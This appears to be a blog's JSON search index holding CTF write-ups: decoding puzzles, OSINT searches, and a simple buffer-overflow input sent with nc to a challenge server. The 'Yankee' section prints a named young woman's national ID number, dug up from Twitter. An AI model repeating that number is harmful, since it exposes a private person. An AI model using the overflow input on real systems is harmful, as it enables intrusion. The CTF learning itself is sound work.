we decode it with dcode.fr the result it\u0026rsquo;s not make sense\nEOMB MC VCAL EBU PAUNT CNAPPPJ FNI CNAPPPJ FNI CNAPPPJ DUGIP\rBy the challenge name and description rolling, we can assumed to flipped the image horizontally 180 degrees, and get perfect results then wrap it to make it lowercase\nLACTF ROLLING\rAND ROLLING\rAND ROLLING\rUNTIL THE\rPIGS GO HOME\rFLAG\rlactf{rolling_and_rolling_and_rolling_until_the_pigs_go_home}\ngatekeep Description\rIf I gaslight you enough, you won\u0026rsquo;t be able to get my flag! :) nc lac.tf 31121 Note: The attached binary is the exact same as the one executing on the remote server. Dockerfile gatekeep.c gatekeep\nThis one is the basic pwn challenges, we can analyze a given binary-elf file using the IDA Disassembler.\nSo it\u0026rsquo;s just a buffer overflow checking to see if the input is the same as the program variables in the stacks. We just need to send as many A as possible then the program will overwrite the input, and we get the flags.\nbash\r$ nc lac.tf 31121 If I gaslight you enough, you won\u0026#39;t be able to guess my password! :) Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA I swore that was the right password ... Guess I couldn\u0026#39;t gaslight you! lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}\rOr we can use these payload python3 -c 'print(\u0026quot;a\u0026quot;*50)' | {{nc}} that was given by the official challenges archive repo\nbash\r$ nc lac.tf 31121 If I gaslight you enough, you won\u0026#39;t be able to guess my password! :) Password: python3 -c \u0026#39;print(\u0026#34;a\u0026#34;*50)\u0026#39; | {{nc}} I swore that was the right password ... Guess I couldn\u0026#39;t gaslight you! lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}\rFLAG\rlactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}\n","date":"2023-02-13","id":28,"permalink":"/posts/ctfs/2023/la-ctf-2023/","summary":"https://ctftime.org/event/1732\nCHALL\u0026rsquo;S SOLVED Category Challenge CRYPTOGRAPHY one-more-time-pad WEB college-tour REVERSING string-cheese MISC CATS! one-more-time-pad Description\rI heard the onetime pad is perfectly secure so I used it to send an important message to a friend, but now a UCLA competition is asking for the key?","tags":[],"title":"LA CTF 2023"},{"content":"https://ctftime.org/event/1822\nCHALL\u0026rsquo;S Category Challenges MISC Welcome to NECTF MISC Bad Cake MISC Santa\u0026rsquo;s Key MISC Star of Bethlehem GITHUB Entrance Exam FORENSICS X-mas Carol PWN The Real Santa OSINT X-mas Castle TRIVIA Smart Brains Welcome to NECTF Just inspect it CTRL + SHIFT + I\nFLAG\rNECTF{w3LC0M3_t0_N3CTF}\nBad Cake Here\u0026rsquo;s the source of the badcake.dat file\nbadcake.dat\r‰PNG \u001a IHDR õ õ\u0008 ­Úì¹ \u0003‚IDATxÚíÚAŽã0\u000c\u0005ÑÜÿÒ3Ë\u0006‚H©/Ê@$–W‰#ûy š\u0026#34;ùú×ñx©V­ZµjÕªUÿºúõýx;ù}­é)\u001fßÖ\u001b~ütÝá%³»W­Zõõj°\u0026gt;½\u0008}vÃ\u0007øégŸþZ¸{ÕªU÷PƒËø:\\\u0019|\u0001þ ¼\u0026#34;Æ\u0026#39;«V­ZõäfæˆÆÿáyù%U«V­:UïIZË?S­Zµê`‡:OF¿\\\u000e\u0016\u0019Ë|{UAµjÕ‡©óhùK=ØñQ­Zõ9j\u0026lt;Ô\u0001£tÞçˆÚ\u001e´T¹i\u001aGµjÕç¨A\u0026lt;,\u0007üÅÙ—ù\u0010\u000b½gÕªU7Qƒž) Ðà[\u0010‘iï#ŸÐS­ZõÕê¼9\u0011…Q°ÀbS8Ê˜U«VÝD\u001du7¢æ\u0004ØªG›çÒ“U­Zõõjç\u000em¥y\u00022Ò¼\u000e©ZµêžjšñÑ-ójÞ˜Ô+³»jÕªoVÓ@\u000e\u001eQÞ7\u0001ÅHš6ƒ’¡jÕª¯V—ç\u0026gt;\u0016»%\u000f÷M6U\u0015T«V}˜šÎŒDþ¨oB;¹ôÿg¡ª Zµê³Õó¬’¶8öŒDÁ=ÊWU«VÝD\u001dm·£¼\u0011¼\u0026#39;¢Û ý\u00102—¢ZµêKÕùú´Z8\u000cî´ÄWy1ŒTµjÕ·¨é2`4ŽŽ¸€vn^sT­Zuwu4.Bã+Ý}ƒU¢õT«VÝXM£`¥­ öÜ4U¥…B2—¢Zµê«Ô‹Sl ð‚8\u000c¦ö\u0016;-«\\ÕªU_ Î|L¥¼¿®ÜŸjÕª›¨iŒŒ\u0026gt;‚\u0026#34;cÔ\u000f\u0001½ßñ·ªU«¾^M÷ÒåÖmT_ÜS2T­Zu\u00135H-Aô¥«Ð²ä¼^™w_T«V}¿:ol€þ\u0005È\u001b£jaÔ ©÷\u0026gt;T«V}¢:ÚZGm ÚPÙ“Ü–Þ\\ªU«¾Y½{`…6vç\u0026#39;ƒ9âR\u000cW­Zõ±jdÒ¥³¶j\u001c¾\u0017‡ST«V­:\u001d!ÉŸ\u001dx\u001c‹ÍÞR\u000cW­Zõ±j\u0010#çñš¶G@\u001d’’ò¶jÕªÛ©+E¼Êt\u000bÝnÓ\u0026#39;–ÅpÕªU_ ®¸¢Û¯\u0026lt;„Ê›EµjÕ÷«£àY9…nÚAÎ\u0019e®ªU«n¢¦G¥í\u0001Ú(\u0015Í|\u000f¯Zµê\u0026amp;êè~+ûkx‚m\u0026gt;X\u000fg¤ªU«¾OM/¼§=\u0012µi£õ¾$²ªU«î¡žçty\u0018¥™\u0026amp;ÍWóÌUµjÕª—H$”súê\\ŠjÕª›«ic#ïä.– £g¢Zµê\u0026amp;jðãh$\u0005¤›óU¢\u0016Ç3U\u0005ÕªU\u001f¦\u00061rÑ\u001fmÕ\u0017S_ÚUQ­ZõÕêF‡jÕªU«V­Zõo\u001eÿ\u0001³üNÇ¯Ðf\u0026lt; IEND®B`‚\rI just realised there’s a PNG information in .dat file so I accidentaly convert into a .png format, and how unexpected the .png file contain a image of QR-Code\nAfter scanning the QR-Code here’s the result, there\u0026rsquo;s message in base64\nNGUgNDUgNDMgNTQgNDYgN2IgNTQgNDggMzEgMjQgNWYgMzEgMjQgNWYgNTkgMzAgNTUgNTIgNWYgNDcgNGYgMzAgNDQgNWYgNDMgNDAgNGIgMzMgN2Q=\rThen after I decoded base64, we got Hex output\nbash\r$ echo \u0026#39;NGUgNDUgNDMgNTQgNDYgN2IgNTQgNDggMzEgMjQgNWYgMzEgMjQgNWYgNTkgMzAgNTUgNTIgNWYgNDcgNGYgMzAgNDQgNWYgNDMgNDAgNGIgMzMgN2Q=\u0026#39; | base64 -d\rWe can use https://asciitohex.com to decoded Hex into ASCII\nFLAG\rNECTF{TH1$_1$_Y0UR_GO0D_C@K3}\nSanta\u0026rsquo;s Key We given a python file called incorrect.py\nincorrect.py\r1def str_xor(secret, key): 2 #extend key to secret length 3 new_key = key 4 i = 0 5 while len(new_key) \u0026lt; len(secret): 6 new_key = new_key + key[i] 7 i = (i + 1) % len(key) 8 a = [] 9 for (secret_c,new_key_c) in zip(secret,new_key): 10 a.append(chr(ord(secret_c) ^ ord(new_key_c))) 11 return \u0026#39;\u0026#39;.join(a) 12 13flag_enc = 0x1d,0x24,0x2d,0x20,0x27,0x28,0x32,0x2e,0x1a,0x35,0x32,0x46,0x1d,0x2b,0xa,0x60,0x18,0x31,0x1c,0x52,0x21,0x52,0x13 14flag = str_xor(flag_enc, \u0026#39;Santa\u0026#39;) 15print(\u0026#39;That is correct! Here\\\u0026#39;s your flag: \u0026#39; + flag)\rAfter I execute that python file, we got an error message that we need to encrypt the Hexadecimal numbers.\nThe solution is, We need to rewrite the code and changes some code, and here’s the result of code to get output like this\nincorrect_solver.py\r1def str_xor(secret, key): 2 #extend key to secret length 3 new_key = key 4 i = 0 5 while len(new_key) \u0026lt; len(secret): 6 new_key = new_key + key[i] 7 i = (i + 1) % len(key) 8 a = [] 9 for (secret_c,new_key_c) in zip(secret,new_key): 10 a.append(chr(ord(secret_c) ^ ord(new_key_c))) 11 return \u0026#39;\u0026#39;.join(a) 12 13flag_enc = chr(0x1d)+chr(0x24)+chr(0x2d)+chr(0x20)+chr(0x27)+chr(0x28)+chr(0x32)+chr(0x2e)+chr(0x1a)+chr(0x35)+chr(0x32)+chr(0x46)+chr(0x1d)+chr(0x2b)+chr(0xa,)+chr(0x60)+chr(0x18)+chr(0x31)+chr(0x1c)+chr(0x52)+chr(0x21)+chr(0x52)+chr(0x13) 14flag = str_xor(flag_enc, \u0026#39;Santa\u0026#39;) 15print(\u0026#39;That is correct! Here\\\u0026#39;s your flag: \u0026#39; + flag)\rFLAG\rNECTF{S@nTa's_k3y_h3r3}\nStar of Bethlehem All we need to do it’s just check the list of strings of that BrightStar ELF Shared Library file , using strings command to solve this chall. Then we can found the flag\nbash\r$ strings BrightStar\rGot ya.. flag!!\nFLAG\rNECTF{STaR_Of_BeTheLeHeM} Entrance Exam https://github.com/NOESCAPECTF-LIVE/Welcome_to_NoEscape_EntranceExam\nThere is a python file calleded intro.py, let\u0026rsquo;s go ahead run it\n636c617373726f6f6d2e6769746875622e636f6d2f612f6d6f4f7739653674\rJust decode from Hex into ASCII using https://asciitohex.com\nHere’s the result https://classroom.github.com/a/moOw9e6t\nWe need to enroll that classroom assignment, just Accept it\nAnd that was a flag!\nFLAG\rNECTF{C0ng@T$,Y0u_R_3nr0l13d}\nX-mas Carol We given a file .mp3 the audio, and is just a ordinary song of christmas, and there’s a strange corrupt voice or maybe something information.\nSo I decided to using Audio Tools - Sonic Visulizer to see any information of the audio, and it doesn’t help us.\nI tried to see strings of the Audio file, not just a default string of the audio, I found a many of text NECTF in the file.\nLook.. there\u0026rsquo;s a .txt file on the last chunk of the image strings.\nI extracted using binwalk and it’s true, the chall image contain of carol.txt file, then I opened that and Found the Flag.\nFLAG\rNECTF{J1ngl3s_@alL_th3_wAy} The Real Santa We given a binary elf file called realSanta, I thought that this chall was difficult, however it\u0026rsquo;s not.\nJust open the IDA debugger and we’ve got the part of the Flag\nFLAG\rNECTF{EUR3KA}\nX-mas Castle We given an image of place and we need to identify visual of that image, so I just search it using Google Lens and we got the Place, is Santa Bárbara\nI was submitted the flag just using NECTF{santa_bárbara} and it\u0026rsquo;s wrong, the actual flag it\u0026rsquo;s include castle string\nFLAG :\rNECTF{santa_bárbara_castle}\nSmart Brains mhsn pz olyl vusf. Qbza zbitpa.\nJust decode it using https://www.dcode.fr/caesar-cipher and you get the result part of the flag of any rot decode,\nFLAG\rNECTF{falg}\n","date":"2022-12-05","id":29,"permalink":"/posts/ctfs/2022/no-escape-ctf-2022/","summary":"https://ctftime.org/event/1822\nCHALL\u0026rsquo;S Category Challenges MISC Welcome to NECTF MISC Bad Cake MISC Santa\u0026rsquo;s Key MISC Star of Bethlehem GITHUB Entrance Exam FORENSICS X-mas Carol PWN The Real Santa OSINT X-mas Castle TRIVIA Smart Brains Welcome to NECTF Just inspect it CTRL + SHIFT + I","tags":[],"title":"NO ESCAPE CTF 2022"},{"content":"https://ctftime.org/event/1753\nCHALL\u0026rsquo;S Category Challenges Welcome Welcome OSINT Attack of Tsukushi OSINT FlyMeToTheTsukushi OSINT Money Welcome Discord Server\nFlag: TsukuCTF22{Welcome_to_TsukuCTF_2022!!!!}\nAttack of Tsukushi すみません、日本語が上手はないです。😅\nTrying to translated into English\nIt given an image Attack_of_Tsukushi.jpg\nI’m trying to find on Google by searching Levi statue in Japan Station And I found a website that give information of that statue, in JR Hita Station https://www.ungeek.ph/2021/03/attack-on-titans-levi-gets-a-statue-in-japan/\nSo I need to search JR Hita station on Google Maps, and I found the Address Information within Postal Code 11-1 Motomachi, Hita, Oita 877-0013, Japan https://goo.gl/maps/WH5aUtXt4MHX15A69\nThe location which located in Oita Prefecture, Japan The Postal Code is: 877-0013 then change into flag format\nFlag: TsukuCTF22{8770013}\nFlyMeToTheTsukushi It says\nThis question can only be flagged up to 10 times. The format of the flag is TsukuCTF22{airport name}. Enter only the name of the airport. (For hoge airport, only hoge is the flag)\nI just realize that has a word “TAKENOYA”\nSo I just googling it, and it’s The Restaurant name\nAnd then I just search words TAKENOYA within Airport words, and found the website look like this\nOkay it’s Takenoya Fukuoka Airport, Trying to submit flag with that fukuoka name, and how unexpected.. the flag it’s correct :) yayy.\nhttps://www.fukuoka-airport.jp/en/shops/takenoya.html\nFlag: TsukuCTF22{fukuoka}\nMoney I need to find the Postal Code of that image place, so I search using Google Lens and found some images that looks similar\nYeahh I gottem\nThe image that look similar, it has in Shutterstock https://www.shutterstock.com/image-photo/people-throw-coin-stone-buddha-statue-1665495286\nI found another image that has name of that places, is The Kinkakuji\u0026rsquo;s coin wish place https://www.shutterstock.com/image-photo/kinkakujis-coin-wish-place-1490425859\nSo I search that on Google Maps, and found the place https://goo.gl/maps/WgR3XXX8xgtCRuc26\nThe Postal Code is 1 Kinkakujicho, Kita Ward, Kyoto, 603-8361, Japan\nFlag: TsukuCTF22{6038361}\n","date":"2022-12-05","id":30,"permalink":"/posts/ctfs/2022/tsuku-ctf-2022/","summary":"https://ctftime.org/event/1753\nCHALL\u0026rsquo;S Category Challenges Welcome Welcome OSINT Attack of Tsukushi OSINT FlyMeToTheTsukushi OSINT Money Welcome Discord Server\nFlag: TsukuCTF22{Welcome_to_TsukuCTF_2022!!!!}\nAttack of Tsukushi すみません、日本語が上手はないです。😅","tags":[],"title":"Tsuku CTF 2022"},{"content":"https://ctftime.org/event/1790\nCHALL\u0026rsquo;S Category Challenge GITHUB Classroom OSINT Square OSINT Yankee METAVERSE Intro BLOCKCHAIN Secrets BLOCKCHAIN Call Classroom This challenge category is GITHUB, it the first chall is called Classroom we given a link https://github.com/Octoversity-Admissions/Admissions-Test\nAll we need to do is accessed the repository that has file called intro.py we need to run that then you got the output like this\nI assume that’s a link, there’s a random number, I thought it’s Hexadecimal value, and it’s right, I decoded that Hexadecimal value using AsciiToHex Tools we got output like this, Yeahh.. we got the output, now we have to assembled the link\nhttps://classroom.github.com/assignment-invitations/25a94104e34a852f3af0a8a53d734fad\nafter we entered the link, we need to authenticate to Github account agreement to entered Github Classroom,\nLook, now we have to entered that link\nWe got the first flag now 😎\nFlag: EKO{s3cur1ty_thru_0bscur1ty}\nSquare This osint challenge we given an image square.png we have to identify the name of the monument\nArround the statue it has a building, we need find that building using Google Lens\nThat’s building Hotel name is Hotel Agualongo, aight now find that hotel on Google Maps\nAfter you look around the hotel, you have to specify the coordinate of that Monument, I got this coordinate POV using Google Maps, so the main square name is Plaza de Narino Then I just search on Google by using keyword “plaza de narino statue monument” then I got the statue person name, which is Antonio Narino.\nWhen I trying to submit the Flag, I got the wrong submitted flag,\nThe flag format should be correct, but it was wrong, it turns out that the original name of the person from the monument must match the alphabet,\nThere\u0026rsquo;s wrong with n alphabet in Spanish it should be ñ now let\u0026rsquo;s go ahead and try submit that,\nSo the spanish person name of that statue monument for flag is antonio nariño, the flag is correct now,\nFlag: EKO{antonio_nariño}\nYankee We are given a challenge like this, basically we are told to seek DNI from a girl (her) and that person commits a case of counterfeiting tickets for a Daddy Yankee concert, the woman is still 18 years old, and we have to identify to get a DNI (Documento Nasiconal Identidad)\nI want to know that person, so I search on Google by keyword “Daddy Yankee fake ticket”, and it turns out that the person who faked the ticket was a girl named Pamela Cabanillas.\nThen I just search for her DNI on google, and I found a twitter page that discussing about this person, there is a picture of that person\u0026rsquo;s DNI, then I visited this twitter https://twitter.com/lachill721/status/1582889263233871872\nThe twitter account replies to his own post, and attaches a photo that looks like this and then there is a DNI information, which is 72266384, and that’s the flag.\nFlag: EKO{72266384}\nIntro Idk but, is Metaverse a new category of ctf ? We given a challenge called Intro that has link into website,\nWelcome to the EKOVERSE!\nIt just show blank page without any informations\nFirst thing first, the most common thing that every IT person does is identify the source of the web by Inspecting the elements of the website, it will look like this,\nI just identifying to other informations, but Hmm.. sus 🤔🧐 there are same .png file https://uploads-prod.reticulum.io/files/18fc3e04-89ea-4bdd-b669-96824311ca18.png\nAnd that was a flag\nFlag: EKO{v3rs3}\nSecrets We are given a challenge with the BLOCKCHAIN category called Secrets, and given the address of the Ethereum blockchain transaction, which is contract 0x5af2ca84205681B278ee3552dFB8AeBeE49610F9\nI know it\u0026rsquo;s Ropsten Ethereum, which is an Ethereum test network that allows blockchain development testing before being placed on the Mainnet I tried to access a website that contains transactions, addresses, tokens and other activities on https://ropsten.etherscan.io/\nThen on this website I look for transaction information and then I enter the address that has been given, https://blockscan.com/address/0x5af2ca84205681B278ee3552dFB8AeBeE49610F9\nThe search results show 3 transactions, I tried to open detailed information on successful transactions. There is some information about the transaction in the form of Transaction hash, status, block timestamp, etc. Here, it can be seen in the transaction that there is a contract address as given in this challenge In the data input menu, there is bytecode that originally appeared as follows, View Input As → Default View\nIf I change View Input As to UTF-8 Format here, We can see the Flag:\nFlag: EKO{N3v3r_P0sT_s3cr3ts!}\nCall We are given a challenge in the form of address 0xb8101db8 or can be called a 4-byte signature of ETH function, which if we decode the address is the name of the function\nI try to search on Google the 4-byte signature of the ETH function, and there will be a relevant website, one of the websites used to decode the function address is, https://www.4byte.directory/ I try to use the tools from the web, then search with the address given in this challenge, the following is the result of the decoding, the name of the function is, isKnownCallToEkoparty() The flag format is just a function name, without () parentheses.\nFlag: EKO{isKnownCallToEkoparty}\n","date":"2022-11-05","id":31,"permalink":"/posts/ctfs/2022/ekoparty-ctf-2022/","summary":"https://ctftime.org/event/1790\nCHALL\u0026rsquo;S Category Challenge GITHUB Classroom OSINT Square OSINT Yankee METAVERSE Intro BLOCKCHAIN Secrets BLOCKCHAIN Call Classroom This challenge category is GITHUB, it the first chall is called Classroom we given a link https://github.","tags":[],"title":"EKOPARTY CTF 2022"},{"content":"\nCHALL\u0026rsquo;S Category Challenge Chall 1 Chall 1 CHALL 1 http://pentest.student.1337hackathon.id:81/\nDiberikan sebuah soal nomor 1 berupa webpage berikut, setelah itu kami cari tahu view page sourcenya seperti berikut\nKemudian kami menemukan clue pada saat kami meng-inspect halamannya, yaitu berupa strings base64\nRGVjb2RlIHBhcnQ1IGJ5IHVzaW5nIHRoZSBYT1IgZnVuY3Rpb24gd2l0aCBjdXN0b20gY3NzIG51bWJlci4=\rSetelah kami decode hasilnya seperti berikut\nbash\r$ echo \u0026#39;RGVjb2RlIHBhcnQ1IGJ5IHVzaW5nIHRoZSBYT1IgZnVuY3Rpb24gd2l0aCBjdXN0b20gY3NzIG51bWJlci4=\u0026#39; | base64 --decode\rSingkat cerita kami coba menggunakan curl dengan parameter -v untuk mencari informasi dari URL-nya, dan kami menemukan potongan flag berupa Hexadecimal\nbash\r$ curl -v http://pentest.student.1337hackathon.id:81/\rSetelah itu kami coba decode dari format Hexadecimal to ASCII dengan tools https://www.rapidtables.com/convert/number/hex-to-ascii.html Didapatkanlah Flag Part1 s/d Part4 nya yaitu, BPJS{Mel4y4ni_s3penuh_h4t!_m3l4mp4u1 dan tinggal sisa Part5 dari flagnya yaitu %y?y=,#}\nSesuai dengan cluenya yaitu “Decode part5 by using the XOR function with custom css number.” maka dari itu kami mencari script untuk memecahkan XOR function dengan custom css number dan menemukan script dari post berikut https://crypto.stackexchange.com/questions/98727/how-can-i-decode-a-xor-cipher-with-a-string-key-i-know\nBerikut script Python-nya\npart5.py\rdef decrypt(encrypted: bytes, key: bytes): result = [] for i in range(len(encrypted)): result.append(encrypted[i] ^ key[i % len(key)]) return bytes(result)\rLalu kami jalankan dengan command python3 -i xor_solver.py dan didapatkanlah Part5 dari Flagnya yaitu h4r4pan\nbash\r$ python3 -i xor_solver.py \u0026gt;\u0026gt;\u0026gt; encrypted = b\u0026#34;%y?y=,#\u0026#34; \u0026gt;\u0026gt;\u0026gt; key = bytes([77]) \u0026gt;\u0026gt;\u0026gt; decrypt(encrypted, key)\rFlag: BPJS{Mel4y4ni_s3penuh_h4t!_m3l4mp4u1_h4r4pan}\n","date":"2022-11-05","id":32,"permalink":"/posts/ctfs/2022/healthkathon-bpjs-2022/","summary":"CHALL\u0026rsquo;S Category Challenge Chall 1 Chall 1 CHALL 1 http://pentest.student.1337hackathon.id:81/\nDiberikan sebuah soal nomor 1 berupa webpage berikut, setelah itu kami cari tahu view page sourcenya seperti berikut","tags":[],"title":"Healthkathon BPJS 2022"},{"content":"Only solve the HackerClass Wave lmao 😭\nhttps://ctftime.org/event/1811\nRepo File Compfest 14 CTF 2022\nWriteup Docs HackerClass Wave Compfest 14 2022\n","date":"2022-08-28","id":33,"permalink":"/posts/ctfs/2022/compfest-14-ctf-2022/","summary":"Only solve the HackerClass Wave lmao 😭\nhttps://ctftime.org/event/1811\nRepo File Compfest 14 CTF 2022\nWriteup Docs HackerClass Wave Compfest 14 2022","tags":[],"title":"COMPFEST 14 CTF 2022"},{"content":"","date":"2023-09-07","id":34,"permalink":"/posts/","summary":"","tags":[],"title":"Posts"},{"content":"","date":"2023-09-07","id":35,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":36,"permalink":"/","summary":"","tags":[],"title":"nopedawn"},{"content":"","date":"0001-01-01","id":37,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"},{"content":"","date":"0001-01-01","id":38,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"},{"content":"","date":"0001-01-01","id":39,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"}]